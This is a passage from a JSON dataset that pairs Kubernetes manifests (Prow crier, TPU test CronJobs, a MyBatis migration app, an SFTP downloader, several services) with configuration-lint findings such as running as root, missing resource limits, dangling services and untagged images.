/etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "11084",
    "manifest_path": "data/manifests/the_stack_sample/sample_4257.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20220111-cd3e975bc1\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "11085",
    "manifest_path": "data/manifests/the_stack_sample/sample_4257.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20220111-cd3e975bc1\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "11086",
    "manifest_path": "data/manifests/the_stack_sample/sample_4259.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-keras-api-transfer-learning-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - args:\n          - /bin/bash\n          - -c\n          - 'set -u\n\n            set -e\n\n            set -x\n\n\n            export PATH=$PATH:/root/google-cloud-sdk/bin\n\n            gcloud source repos clone cloudtpu-tf20-api-tests --project=gcp-tpupods-demo\n\n            cd cloudtpu-tf20-api-tests\n\n            pip3 install behave\n\n            behave -e ipynb_checkpoints --tags=-fails -i transfer_learning\n\n            '\n          - --model_dir=$(MODEL_DIR)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false\\n },\\n \\\"test_name\\\": \\\"tf-nightly-keras-api-transfer-learning-v2-8\\\"\\\n              \\n}\\n\"\n          - name: MODEL_DIR\n            value: gs://xl-ml-test-us-central1/k8s/keras-api/transfer-learning/v2-8/$(JOB_NAME)\n          image: gcr.io/xl-ml-test/model-garden:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 8\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "11087",
    "manifest_path": "data/manifests/the_stack_sample/sample_4259.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-keras-api-transfer-learning-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - args:\n          - /bin/bash\n          - -c\n          - 'set -u\n\n            set -e\n\n            set -x\n\n\n            export PATH=$PATH:/root/google-cloud-sdk/bin\n\n            gcloud source repos clone cloudtpu-tf20-api-tests --project=gcp-tpupods-demo\n\n            cd cloudtpu-tf20-api-tests\n\n            pip3 install behave\n\n            behave -e ipynb_checkpoints --tags=-fails -i transfer_learning\n\n            '\n          - --model_dir=$(MODEL_DIR)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false\\n },\\n \\\"test_name\\\": \\\"tf-nightly-keras-api-transfer-learning-v2-8\\\"\\\n              \\n}\\n\"\n          - name: MODEL_DIR\n            value: gs://xl-ml-test-us-central1/k8s/keras-api/transfer-learning/v2-8/$(JOB_NAME)\n          image: gcr.io/xl-ml-test/model-garden:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 8\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "11088",
    "manifest_path": "data/manifests/the_stack_sample/sample_4259.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-keras-api-transfer-learning-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - args:\n          - /bin/bash\n          - -c\n          - 'set -u\n\n            set -e\n\n            set -x\n\n\n            export PATH=$PATH:/root/google-cloud-sdk/bin\n\n            gcloud source repos clone cloudtpu-tf20-api-tests --project=gcp-tpupods-demo\n\n            cd cloudtpu-tf20-api-tests\n\n            pip3 install behave\n\n            behave -e ipynb_checkpoints --tags=-fails -i transfer_learning\n\n            '\n          - --model_dir=$(MODEL_DIR)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false\\n },\\n \\\"test_name\\\": \\\"tf-nightly-keras-api-transfer-learning-v2-8\\\"\\\n              \\n}\\n\"\n          - name: MODEL_DIR\n            value: gs://xl-ml-test-us-central1/k8s/keras-api/transfer-learning/v2-8/$(JOB_NAME)\n          image: gcr.io/xl-ml-test/model-garden:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 8\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"train\" has cpu request 0"
  },
  {
    "id": "11089",
    "manifest_path": "data/manifests/the_stack_sample/sample_4259.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-keras-api-transfer-learning-v2-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - args:\n          - /bin/bash\n          - -c\n          - 'set -u\n\n            set -e\n\n            set -x\n\n\n            export PATH=$PATH:/root/google-cloud-sdk/bin\n\n            gcloud source repos clone cloudtpu-tf20-api-tests --project=gcp-tpupods-demo\n\n            cd cloudtpu-tf20-api-tests\n\n            pip3 install behave\n\n            behave -e ipynb_checkpoints --tags=-fails -i transfer_learning\n\n            '\n          - --model_dir=$(MODEL_DIR)\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false\\n },\\n \\\"test_name\\\": \\\"tf-nightly-keras-api-transfer-learning-v2-8\\\"\\\n              \\n}\\n\"\n          - name: MODEL_DIR\n            value: gs://xl-ml-test-us-central1/k8s/keras-api/transfer-learning/v2-8/$(JOB_NAME)\n          image: gcr.io/xl-ml-test/model-garden:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v2: 8\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "11090",
    "manifest_path": "data/manifests/the_stack_sample/sample_4261.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: grafana\nspec:\n  type: NodePort\n  ports:\n  - port: 3000\n    protocol: TCP\n    targetPort: 3000\n    nodePort: 30007\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "11091",
    "manifest_path": "data/manifests/the_stack_sample/sample_4262.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: fosspay\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: http\n    service.beta.kubernetes.io/aws-load-balancer-ssl-cert: arn:aws:acm:us-east-1:102409834926:certificate/391c5233-9d97-4013-9cc1-9bc85716053b\n    service.beta.kubernetes.io/aws-load-balancer-ssl-ports: https\nspec:\n  type: LoadBalancer\n  selector:\n    app: fosspay\n  ports:\n  - name: http\n    port: 80\n    targetPort: 80\n  - name: https\n    port: 443\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:fosspay])"
  },
  {
    "id": "11092",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db-mybatis-migration-some-app\" does not have a read-only root file system"
  },
  {
    "id": "11093",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db-mybatis-migration-verification\" does not have a read-only root file system"
  },
  {
    "id": "11094",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db-mybatis-migration-some-app\" is not set to runAsNonRoot"
  },
  {
    "id": "11095",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db-mybatis-migration-verification\" is not set to runAsNonRoot"
  },
  {
    "id": "11096",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db-mybatis-migration-some-app\" has cpu request 0"
  },
  {
    "id": "11097",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db-mybatis-migration-verification\" has cpu request 0"
  },
  {
    "id": "11098",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db-mybatis-migration-some-app\" has memory limit 0"
  },
  {
    "id": "11099",
    "manifest_path": "data/manifests/the_stack_sample/sample_4263.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db-mybatis-migration-app\n  labels:\n    app: db-mybatis-migration-app\nspec:\n  selector:\n    matchLabels:\n      app: db-mybatis-migration-app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: db-mybatis-migration-app\n    spec:\n      initContainers:\n      - name: db-mybatis-migration-verification\n        image: example-mybatis-database-migration:v2\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -c\n        - /opt/migrations/bin/migrate status | tee /dev/stderr | grep -q '...pending...'\n          && exit 1 || exit 0\n      containers:\n      - name: db-mybatis-migration-some-app\n        image: nginx:stable\n        imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db-mybatis-migration-verification\" has memory limit 0"
  },
  {
    "id": "11100",
    "manifest_path": "data/manifests/the_stack_sample/sample_4266.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: arpa-downloader\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: arpa-rm\n      spec:\n        containers:\n        - name: arpa-downloader\n          image: nexus.daf.teamdigitale.it/arpa-downloader:0.0.1\n          env:\n          - name: sftp_host\n            value: daf.teamdigitale.it\n          - name: sftp_user\n            value: comune_roma_daf\n          - name: sftp_key_file\n            value: ./secret/comune_roma_sftp-key\n          - name: sftp_folder\n            value: ENVI/misurazioni/dati_chimici_roma/\n          volumeMounts:\n          - name: glusterfsvol\n            mountPath: /opt/arpa-downloader/logs\n            subPath: arpa-downloader/logs\n          - name: sftp-key\n            mountPath: /opt/arpa-downloader/secret\n            readOnly: true\n        volumes:\n        - name: glusterfsvol\n          persistentVolumeClaim:\n            claimName: gluster-claim\n        - name: sftp-key\n          secret:\n            secretName: pa-secret\n            items:\n            - key: comune_roma_sftp-key\n              path: comune_roma_sftp-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"arpa-downloader\" does not have a read-only root file system"
  },
  {
    "id": "11101",
    "manifest_path": "data/manifests/the_stack_sample/sample_4266.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: arpa-downloader\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: arpa-rm\n      spec:\n        containers:\n        - name: arpa-downloader\n          image: nexus.daf.teamdigitale.it/arpa-downloader:0.0.1\n          env:\n          - name: sftp_host\n            value: daf.teamdigitale.it\n          - name: sftp_user\n            value: comune_roma_daf\n          - name: sftp_key_file\n            value: ./secret/comune_roma_sftp-key\n          - name: sftp_folder\n            value: ENVI/misurazioni/dati_chimici_roma/\n          volumeMounts:\n          - name: glusterfsvol\n            mountPath: /opt/arpa-downloader/logs\n            subPath: arpa-downloader/logs\n          - name: sftp-key\n            mountPath: /opt/arpa-downloader/secret\n            readOnly: true\n        volumes:\n        - name: glusterfsvol\n          persistentVolumeClaim:\n            claimName: gluster-claim\n        - name: sftp-key\n          secret:\n            secretName: pa-secret\n            items:\n            - key: comune_roma_sftp-key\n              path: comune_roma_sftp-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"arpa-downloader\" is not set to runAsNonRoot"
  },
  {
    "id": "11102",
    "manifest_path": "data/manifests/the_stack_sample/sample_4266.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: arpa-downloader\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: arpa-rm\n      spec:\n        containers:\n        - name: arpa-downloader\n          image: nexus.daf.teamdigitale.it/arpa-downloader:0.0.1\n          env:\n          - name: sftp_host\n            value: daf.teamdigitale.it\n          - name: sftp_user\n            value: comune_roma_daf\n          - name: sftp_key_file\n            value: ./secret/comune_roma_sftp-key\n          - name: sftp_folder\n            value: ENVI/misurazioni/dati_chimici_roma/\n          volumeMounts:\n          - name: glusterfsvol\n            mountPath: /opt/arpa-downloader/logs\n            subPath: arpa-downloader/logs\n          - name: sftp-key\n            mountPath: /opt/arpa-downloader/secret\n            readOnly: true\n        volumes:\n        - name: glusterfsvol\n          persistentVolumeClaim:\n            claimName: gluster-claim\n        - name: sftp-key\n          secret:\n            secretName: pa-secret\n            items:\n            - key: comune_roma_sftp-key\n              path: comune_roma_sftp-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"arpa-downloader\" has cpu request 0"
  },
  {
    "id": "11103",
    "manifest_path": "data/manifests/the_stack_sample/sample_4266.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: arpa-downloader\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        name: arpa-rm\n      spec:\n        containers:\n        - name: arpa-downloader\n          image: nexus.daf.teamdigitale.it/arpa-downloader:0.0.1\n          env:\n          - name: sftp_host\n            value: daf.teamdigitale.it\n          - name: sftp_user\n            value: comune_roma_daf\n          - name: sftp_key_file\n            value: ./secret/comune_roma_sftp-key\n          - name: sftp_folder\n            value: ENVI/misurazioni/dati_chimici_roma/\n          volumeMounts:\n          - name: glusterfsvol\n            mountPath: /opt/arpa-downloader/logs\n            subPath: arpa-downloader/logs\n          - name: sftp-key\n            mountPath: /opt/arpa-downloader/secret\n            readOnly: true\n        volumes:\n        - name: glusterfsvol\n          persistentVolumeClaim:\n            claimName: gluster-claim\n        - name: sftp-key\n          secret:\n            secretName: pa-secret\n            items:\n            - key: comune_roma_sftp-key\n              path: comune_roma_sftp-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"arpa-downloader\" has memory limit 0"
  },
  {
    "id": "11104",
    "manifest_path": "data/manifests/the_stack_sample/sample_4268.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: helloworld-service\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: helloworld\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:helloworld])"
  },
  {
    "id": "11105",
    "manifest_path": "data/manifests/the_stack_sample/sample_4270.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: public-svc\n  namespace: web-dev-namespace\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n  selector:\n    app: tripviewer-svc-deployment\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:tripviewer-svc-deployment])"
  },
  {
    "id": "11106",
    "manifest_path": "data/manifests/the_stack_sample/sample_4271.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-world\nspec:\n  selector:\n    matchLabels:\n      app: hello-world\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hello-world\n    spec:\n      containers:\n      - name: hello-world\n        image: hello-world-image\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            port: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hello-world\" is using an invalid container image, \"hello-world-image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11107",
    "manifest_path": "data/manifests/the_stack_sample/sample_4271.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-world\nspec:\n  selector:\n    matchLabels:\n      app: hello-world\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hello-world\n    spec:\n      containers:\n      - name: hello-world\n        image: hello-world-image\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            port: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello-world\" does not have a read-only root file system"
  },
  {
    "id": "11108",
    "manifest_path": "data/manifests/the_stack_sample/sample_4271.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-world\nspec:\n  selector:\n    matchLabels:\n      app: hello-world\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hello-world\n    spec:\n      containers:\n      - name: hello-world\n        image: hello-world-image\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            port: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello-world\" is not set to runAsNonRoot"
  },
  {
    "id": "11109",
    "manifest_path": "data/manifests/the_stack_sample/sample_4271.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-world\nspec:\n  selector:\n    matchLabels:\n      app: hello-world\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hello-world\n    spec:\n      containers:\n      - name: hello-world\n        image: hello-world-image\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            port: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello-world\" has cpu request 0"
  },
  {
    "id": "11110",
    "manifest_path": "data/manifests/the_stack_sample/sample_4271.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-world\nspec:\n  selector:\n    matchLabels:\n      app: hello-world\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: hello-world\n    spec:\n      containers:\n      - name: hello-world\n        image: hello-world-image\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            port: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello-world\" has memory limit 0"
  },
  {
    "id": "11111",
